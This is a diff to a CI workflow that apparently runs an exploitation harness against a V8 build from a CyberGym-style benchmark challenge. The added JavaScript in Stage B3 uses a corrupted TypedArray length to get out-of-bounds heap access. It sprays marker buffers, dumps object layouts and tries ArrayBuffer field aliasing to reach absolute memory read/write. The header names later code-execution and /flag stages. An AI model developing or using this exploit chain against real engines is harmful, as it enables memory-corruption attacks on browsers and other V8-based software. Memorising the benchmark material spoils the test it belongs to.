@@ -1,11 +1,11 @@
 # V8-446124892 Official PoC Test — multi-stage exploitation harness
-# Revised: Stage B uses proven d=32 length field (len≈x*64) → OOB → overlap.
-# d=-8 disproved as mild-length. ABS_RW/exec/flag not claimed without evidence.
+# Revised: Stage B = d=32 OOB/overlap + Stage B3 abs-R/W alias discovery.
+# ABS_RW_OK only on proven alias; exec/flag not claimed without evidence.
 # Target: cybergym/v8:human-446124892-nosandbox-buildable
 #
 # Stages
 #   L1  Cage primitives + anti-cheat (Tests 1-5, 7-9)     REQUIRED
-#   L2  d=32 length → OOB → overlap (Test 10)  → OOB_OK/OVERLAP_OK if proven
+#   L2  d=32 OOB/overlap + abs-R/W discovery (Test 10)
 #   L3  Exec surfaces + rediscovery (Test 11)  EXEC only if ABS_RW_READY
 #   L4  Flag path (Test 12 / Stage D)                     Real /flag if present; else sim labeled
 #
@@ -4033,7 +4033,7 @@ jobs:
 
 
 
-      - name: Test 10 — Stage B absolute R/W probe (layout dump)
+      - name: Test 10 — Stage B d=32 OOB + abs-R/W discovery
         id: stage_b
         run: |
           set +e
@@ -4041,7 +4041,7 @@ jobs:
           ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
           banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
           log() { echo "[$(ts)] $*"; }
-          banner "TEST 10 / STAGE B — absolute R/W probe (layout measurement)"
+          banner "TEST 10 / STAGE B — d=32 OOB/overlap + abs-R/W discovery"
           mkdir -p /tmp/out
           docker exec "$CONTAINER" sh -c 'mkdir -p /tmp /workspace' 2>/dev/null || true
           # Ensure container is up
@@ -4096,15 +4096,13 @@ jobs:
 
           base = base_without_stage4("/tmp/poc_test_poly.js")
           probe = r"""
-          // ===== STAGE B: proven d=32 length field → OOB → overlap =====
-          // Live RE (challenge d8 V8 14.1 / e75b1ba2):
-          //   caged_write(addrof(ta)+32, x)  =>  ta.length ≈ x * 64
-          //   inflate length → heap OOB R/W past ArrayBuffer
-          //   markers in later TypedArrays appear in OOB window (overlap)
-          // d=-8 is NOT a mild-length field (disproved). No fake abs R/W/exec/flag.
+          // ===== STAGE B: d=32 OOB/overlap + abs-R/W discovery =====
+          // Proven: caged_write(addrof(ta)+32, x) => length ≈ x*64 → OOB → overlap
+          // Next: map OOB window, probe AB/TA store-related fields, try alias abs R/W
+          // ABS_RW_OK=1 only if alias or known-constant proof succeeds. No fake exec/flag.
           (function stageB() {
             print("[*] STAGE_B_BEGIN");
-            print("[*] NEXT_STEP=d32_length_oob_overlap");
+            print("[*] NEXT_STEP=oob_to_abs_rw_discovery");
             if (typeof instance === "undefined" || !instance.exports) {
               print("[-] STAGE_B_NO_INSTANCE");
               print("[*] OOB_OK=0");
@@ -4268,14 +4266,152 @@ jobs:
               print("[*] STAGE_B2_SKIP_OOB reason=no_length_hit");
             }
 
-            // Abs R/W / exec intentionally NOT claimed
+            // ===== STAGE B3: abs R/W discovery (backing-store / alias) =====
+            // Strategy:
+            //  1) OOB window dump around CAFE markers (headers vs elements)
+            //  2) Cage-dump ArrayBuffer fields for two buffers
+            //  3) Single-field swap/alias attempts (restore always)
+            //  4) ABS_RW_OK only on proven write-through alias
+            print("[*] STAGE_B3_ABS_RW_DISCOVERY");
+            let STORE_CANDIDATES = 0;
+            let ALIAS_ATTEMPTS = 0;
+
+            if (OOB_OK === 1) {
+              // Fresh OOB buffer + victims with unique markers
+              let abO = new ArrayBuffer(0x1000);
+              let oob = new Uint32Array(abO);
+              let taO = addrof(oob)|0;
+              let slotO = (taO + 32)|0;
+              let oldO = safe_read(slotO);
+              if (oldO !== null) {
+                safe_write(slotO, 0x100);
+                let vics = [];
+                for (let i = 0; i < 24; i++) {
+                  let a = new ArrayBuffer(0x80);
+                  let v = new Uint32Array(a);
+                  v[0] = 0xBEEF0000 + i;
+                  v[1] = 0xCAFE0000 + i;
+                  vics.push({ab: a, ta: v, aaddr: addrof(a)|0, taddr: addrof(v)|0});
+                }
+                // Find first marker and dump window
+                let hit = -1, hid = -1;
+                let lim = Math.min(oob.length|0, 0x10000);
+                for (let i = 0; i < lim; i++) {
+                  let x = oob[i]|0;
+                  if (((x >>> 16) & 0xFFFF) === 0xBEEF) {
+                    hit = i; hid = x & 0xFFFF;
+                    print("[+] B3 marker oob[" + i + "] id=" + hid);
+                    break;
+                  }
+                }
+                if (hit >= 0) {
+                  let lo = hit - 32; if (lo < 0) lo = 0;
+                  let hi = hit + 48; if (hi > lim) hi = lim;
+                  let wline = "OOB_WINDOW " + lo + ".." + hi + ":";
+                  for (let i = lo; i < hi; i++) {
+                    wline += " [" + i + "]=" + hex(oob[i]|0);
+                  }
+                  print(wline);
+                  // Dump cage fields for that victim AB/TA
+                  if (hid >= 0 && hid < vics.length) {
+                    let V = vics[hid];
+                    let abl = "AB_FIELDS @" + hex(V.aaddr) + ":";
+                    for (let d = 0; d <= 0x40; d += 4) {
+                      let vv = safe_read((V.aaddr + d)|0);
+                      if (vv !== null) abl += " [" + d + "]=" + hex(vv);
+                    }
+                    print(abl);
+                    let tal = "TA_FIELDS @" + hex(V.taddr) + ":";
+                    for (let d = 0; d <= 0x40; d += 4) {
+                      let vv = safe_read((V.taddr + d)|0);
+                      if (vv !== null) tal += " [" + d + "]=" + hex(vv);
+                    }
+                    print(tal);
+                  }
+                } else {
+                  print("[-] B3 no BEEF marker in OOB window");
+                }
+
+                // --- Alias attempts: two ABs, swap one candidate field at a time ---
+                // Candidates chosen from prior RE (may fail; only proof sets ABS_RW_OK)
+                let cand = [16, 20, 24, 28, 32, 36, 40, 44];
+                let abA = new ArrayBuffer(0x100);
+                let abB = new ArrayBuffer(0x100);
+                let uA = new Uint32Array(abA);
+                let uB = new Uint32Array(abB);
+                for (let i = 0; i < 16; i++) { uA[i] = 0xA0000000 + i; uB[i] = 0xB0000000 + i; }
+                let aa = addrof(abA)|0, ba = addrof(abB)|0;
+                let taA = addrof(uA)|0, taB = addrof(uB)|0;
+                print("[*] alias bases AB_A=" + hex(aa) + " AB_B=" + hex(ba) + " TA_A=" + hex(taA) + " TA_B=" + hex(taB));
+
+                function try_alias(obj_off_a, obj_off_b, field_d, label) {
+                  ALIAS_ATTEMPTS++;
+                  let sa = (obj_off_a + field_d)|0;
+                  let sb = (obj_off_b + field_d)|0;
+                  let oa = safe_read(sa);
+                  let ob = safe_read(sb);
+                  if (oa === null || ob === null) return false;
+                  // Point A's field at B's field value (store-like swap)
+                  if (!safe_write(sa, ob)) { safe_write(sa, oa); return false; }
+                  let before = uA[0]|0;
+                  uA[0] = 0x31337377;
+                  let b0 = uB[0]|0;
+                  let a0 = uA[0]|0;
+                  print("[*] alias_try " + label + " d=" + field_d + " A[0]=" + hex(a0) + " B[0]=" + hex(b0) + " beforeA=" + hex(before));
+                  // Success: write through A lands in B (or read of A shows B's prior data pattern)
+                  let ok = false;
+                  if ((b0|0) === (0x31337377|0)) {
+                    ok = true;
+                    print("[+] ALIAS_WRITE_THROUGH " + label + " d=" + field_d);
+                  }
+                  // Restore
+                  safe_write(sa, oa);
+                  uA[0] = before;
+                  uB[0] = 0xB0000000;
+                  return ok;
+                }
+
+                for (let ci = 0; ci < cand.length; ci++) {
+                  let d = cand[ci];
+                  STORE_CANDIDATES++;
+                  if (try_alias(aa, ba, d, "AB")) {
+                    ABS_RW_OK = 1;
+                    ABS_RW_METHOD = "ab_field_alias_d" + d;
+                    print("[+] ABS_RW_OK method=" + ABS_RW_METHOD);
+                    break;
+                  }
+                  if (try_alias(taA, taB, d, "TA")) {
+                    ABS_RW_OK = 1;
+                    ABS_RW_METHOD = "ta_field_alias_d" + d;
+                    print("[+] ABS_RW_OK method=" + ABS_RW_METHOD);
+                    break;
+                  }
+                }
+
+                // Also try setting AB field from TA addrof-derived compressed ptrs (best-effort)
+                if (ABS_RW_OK === 0) {
+                  print("[*] B3 no alias hit on candidate field list");
+                }
+
+                safe_write(slotO, oldO);
+              }
+            } else {
+              print("[*] STAGE_B3_SKIP reason=no_oob");
+            }
+
             print("[*] FIELD_HIT_COUNT=" + FIELD_HIT_COUNT);
             print("[*] LENGTH_HIT=" + LENGTH_HIT);
             print("[*] OOB_OK=" + OOB_OK);
             print("[*] OVERLAP_OK=" + OVERLAP_OK);
+            print("[*] STORE_CANDIDATES=" + STORE_CANDIDATES);
+            print("[*] ALIAS_ATTEMPTS=" + ALIAS_ATTEMPTS);
             print("[*] ABS_RW_OK=" + ABS_RW_OK);
             print("[*] ABS_RW_METHOD=" + ABS_RW_METHOD);
-            print("[*] NOTE=d32_oob_overlap_proven_abs_rw_not_claimed");
+            if (ABS_RW_OK === 1) {
+              print("[*] NOTE=abs_rw_alias_proven");
+            } else {
+              print("[*] NOTE=d32_oob_overlap_ok_abs_rw_pending_re");
+            }
             print("[*] STAGE_B_END");
           })();
           """
@@ -4345,7 +4481,13 @@ jobs:
           OV=$(grep -oE 'OVERLAP_OK=[0-9]+' /tmp/out/test10.combined 2>/dev/null | tail -1 | cut -d= -f2)
           OV=${OV:-0}
           echo "OVERLAP_OK=$OV" | tee -a /tmp/out/test10.result
-          log "Stage B LAYOUT=$LAYOUT ABS_RW=$ABS CAGE_SMOKE=$SMOKE FIELD_HITS=$FHITS METHOD=$ARWM rc=$RC in=$IN_CT"
+          SC=$(grep -oE 'STORE_CANDIDATES=[0-9]+' /tmp/out/test10.combined 2>/dev/null | tail -1 | cut -d= -f2)
+          SC=${SC:-0}
+          AA=$(grep -oE 'ALIAS_ATTEMPTS=[0-9]+' /tmp/out/test10.combined 2>/dev/null | tail -1 | cut -d= -f2)
+          AA=${AA:-0}
+          echo "STORE_CANDIDATES=$SC" | tee -a /tmp/out/test10.result
+          echo "ALIAS_ATTEMPTS=$AA" | tee -a /tmp/out/test10.result
+          log "Stage B LAYOUT=$LAYOUT ABS_RW=$ABS OOB=$OOB OVERLAP=$OV ALIAS_TRIES=$AA METHOD=$ARWM rc=$RC in=$IN_CT"
 
           # Full dump for offline RE → repo path + artifact
           DUMP_ROOT="${GITHUB_WORKSPACE:-/tmp}/exploit-dumps"
